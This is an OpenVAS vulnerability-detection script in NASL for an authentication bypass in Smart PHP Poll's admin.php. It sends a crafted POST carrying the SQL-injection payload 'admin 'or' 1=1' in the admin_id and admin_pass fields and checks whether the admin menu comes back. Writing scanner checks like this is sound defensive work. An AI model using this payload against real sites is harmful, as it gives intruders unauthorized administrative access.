###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_smart_php_poll_auth_bypass_vuln.nasl 11424 2018-09-17 08:03:52Z mmartin $
#
# Smart PHP Poll Authentication Bypass Vulnerability
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805506");
  script_version("$Revision: 11424 $");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"$Date: 2018-09-17 10:03:52 +0200 (Mon, 17 Sep 2018) $");
  script_tag(name:"creation_date", value:"2015-03-17 15:24:03 +0530 (Tue, 17 Mar 2015)");
  script_name("Smart PHP Poll Authentication Bypass Vulnerability");

  script_tag(name:"summary", value:"This host is installed with Smart PHP Poll
  and is prone to authentication bypass vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET and
  check whether it is able to bypass authentication oe not.");

  script_tag(name:"insight", value:"The flaw exists due to inadequate
  validation of input passed via POST parameters 'admin_id' and 'admin_pass'
  to admin.php script");

  script_tag(name:"impact", value:"Successful exploitation will allow
  remote attackers to bypass the authentication.");

  script_tag(name:"affected", value:"Smart PHP Poll");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"exploit");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/36386");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

http_port = get_http_port(default:80);
if(!can_host_php(port:http_port)){
  exit(0);
}

host = http_host_name( port:http_port );

foreach dir (make_list_unique("/", "/smart_php_poll", "/poll", cgi_dirs( port:http_port ) ) ) {

  if( dir == "/" ) dir = "";

  url = dir + "/admin.php";
  rcvRes = http_get_cache(item:url, port:http_port);

  if (rcvRes && rcvRes =~ ">Smart PHP Poll.*Administration Panel<")
  {
    postData = "admin_id=admin+%27or%27+1%3D1&admin_pass=admin+%27or%27+1%3D1";

    #Send Attack Request
    sndReq = string("POST ", url, " HTTP/1.1\r\n",
                    "Host: ", host, "\r\n",
                    "Content-Type: application/x-www-form-urlencoded","\r\n",
                    "Content-Length: ", strlen(postData), "\r\n\r\n",
                    postData);
    rcvRes = http_send_recv(port:http_port, data:sndReq);

    if(rcvRes && ">Main Menu<" >< rcvRes && ">Logout<" >< rcvRes
              && ">Smart PHP Poll" >< rcvRes)
    {
      security_message(port:http_port);
      exit(0);
    }
  }
}

exit(99);
